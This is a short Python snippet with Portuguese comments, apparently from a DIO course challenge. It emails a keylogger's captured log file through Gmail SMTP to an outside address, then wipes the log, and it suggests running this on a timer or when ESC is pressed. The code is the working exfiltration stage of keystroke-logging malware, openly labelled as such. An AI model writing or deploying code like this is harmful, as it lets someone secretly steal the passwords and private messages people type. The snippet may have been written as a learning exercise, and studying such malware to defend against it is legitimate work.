import smtplib
import ssl
from email.message import EmailMessage

# ... (seus imports do pynput)

def enviar_email():
    # Configurações (Use variáveis de ambiente na vida real!)
    email_origem = "seu_email_teste@gmail.com"
    senha_app = "sua_senha_de_app_gerada"  # NÃO É A SENHA DO LOGIN
    email_destino = "email_destino@exemplo.com"

    msg = EmailMessage()
    msg.set_content("Segue em anexo o log capturado.")
    msg['Subject'] = 'Log do Keylogger - Desafio DIO'
    msg['From'] = email_origem
    msg['To'] = email_destino

    # Anexar o arquivo log.txt
    try:
        with open("log.txt", "rb") as f:
            dados_log = f.read()
            msg.add_attachment(dados_log, maintype='text', subtype='plain', filename='log.txt')

        # Conectar e enviar (Exemplo Gmail)
        contexto = ssl.create_default_context()
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=contexto) as server:
            server.login(email_origem, senha_app)
            server.send_message(msg)
        print("E-mail enviado com sucesso!")
        
        # Opcional: Limpar o log após enviar para não enviar dados repetidos
        with open("log.txt", "w") as f:
            f.write("")
            
    except Exception as e:
        print(f"Erro ao enviar email: {e}")

# DICA: Você pode chamar essa função enviar_email() dentro de um Timer
# para rodar a cada X minutos, ou quando o usuário apertar ESC.
